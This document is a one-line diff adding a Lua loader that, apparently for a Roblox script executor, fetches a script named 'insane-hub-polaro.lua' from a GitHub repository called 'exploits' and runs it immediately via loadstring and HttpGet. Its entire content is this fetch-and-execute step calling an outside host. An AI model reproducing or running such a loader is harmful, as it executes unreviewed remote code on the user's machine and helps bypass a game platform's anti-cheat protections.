@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Bjarnos/exploits/main/insane-hub-polaro.lua"))()
